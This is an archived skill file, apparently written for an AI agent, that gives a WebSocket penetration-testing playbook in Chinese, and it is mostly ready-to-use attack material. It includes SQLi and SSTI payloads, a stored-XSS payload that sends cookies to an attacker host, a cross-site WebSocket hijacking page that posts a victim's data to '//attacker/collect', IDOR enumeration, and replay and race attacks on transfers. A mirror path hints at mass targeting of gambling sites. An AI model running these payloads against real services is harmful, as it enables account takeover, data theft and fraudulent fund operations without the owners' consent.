<!-- archived from /root/.hermes/skills/security/websocket-security-testing/SKILL.md on 2026-10-21 -->

---
name: websocket-security-testing
description: "WebSocket渗透时使用。触发: wss://, CSWSH, Socket.IO越权, WS注入, 房间IDOR。"
version: 1.0.0
license: MIT
author: hermes-curator
metadata:
  hermes:
    tags: [pentest, websocket, cswsh, socketio, idor, wss, surveyengine-absorbed]
    related_skills: [websocket-encrypted-protocol-reverse, web-ssrf, api-authz-idor-testing, surveyengine-knowledge-pack]
---

> 归档卡：原目录 `/root/.hermes/skills/security/websocket-security-testing`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/websocket-security-testing/…')`，不要相对 `references/legacy/` 解析。

# WebSocket 渗透完整手法

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收(镜像 `.cursor\skills\websocket-pentest\SKILL.md`,306 行全量)。

## §1 发现 WS 端点
- 前端 JS grep: `ws://` `wss://` `socket` `websocket`(js_secret_hunter 或直接 grep)
- 网络面板 Filter: WS / Frames
- 常见路径: `/ws` `/socket.io` `/game/ws` `/notify` `/chat`

## §2 连接与抓包
```bash
wscat -c "wss://target/ws" -H "Authorization: Bearer <token>" -H "Cookie: session=xxx"
# Socket.IO: wscat -c "wss://target/socket.io/?EIO=4&transport=websocket"
#   发: 42["subscribe",{"room":"hall"}]  收: 42["message",{...}]
```
Python websockets 批量监听库见镜像。

## §3 未授权访问
- 无 token 直连测试: `{"action":"getBalance"}` `{"action":"getOrderList"}`
- 他人 userId 订阅: `{"action":"subscribe","userId":"1","roomId":"admin"}`
- Socket.IO namespace 枚举: /admin /game /chat /pay /notify /internal

## §4 消息注入
- **SQLi**: `{"action":"getRoom","roomId":"1' OR '1'='1"}`、`{"filter":"username=admin'--"}`
- **存储 XSS**: `{"action":"chat","msg":"<img src=x onerror=fetch('//attacker/'+document.cookie)>"}`、setNickname `<svg onload=alert(1)>`
- **SSTI/命令**: `{"data":"{{7*7}}"}` `{"msg":"${7*7}"}` `{"content":"<%= 7*7 %>"}`
- 若为加密 WS 通道: 先逆向协议(见 websocket-encrypted-protocol-reverse)再注入

## §5 CSWSH(跨站 WebSocket 劫持)
WS 握手**不检查 Origin** → 攻击者页面劫持受害者连接:
```html
<script>
const ws = new WebSocket('wss://target/ws');
ws.onopen = () => { ws.send(JSON.stringify({action:"getProfile"})); };
ws.onmessage = (e) => { fetch('//attacker/collect', {method:'POST', body: e.data}); };
</script>
```
验证: curl 握手带 `Origin: https://attacker.com` → 看返回 101(不校验)vs 403。

## §6 房间/频道 IDOR
```python
# 订阅不属于自己的 roomId 1..N, 无 error 响应 = IDOR 命中(脚本见镜像)
```

## §7 重放与篡改
- 重放他人消息/交易请求;篡改 userId/金额/订单号
- 时序竞态: 并行发 transfer

## §8 Socket.IO 专项
- namespace 枚举(path 参数);`42["event",payload]` 帧格式
- 事件名枚举: 常见 subscribe/unsubscribe/joinRoom/leaveRoom/emit 等
- 需认证事件未校验 → 越权操作

## 成功口径
| 档 | 条件 |
|---|---|
| L1 | 发现 WS 端点/未授权可连 |
| L2 | 越权读他人数据(房间 IDOR/消息)或 CSWSH 成立 |
| L3 | 通过 WS 完成资金/管理操作 |

## Pitfalls
- 不干扰真实玩家会话;CSWSH 只做 PoV 证明不批量拖数据
- Socket.IO 老版本(EIO=3)与新版(EIO=4)帧格式不同
- WS 消息注入先确认后端是否真把参数拼进 SQL/模板,别盲发
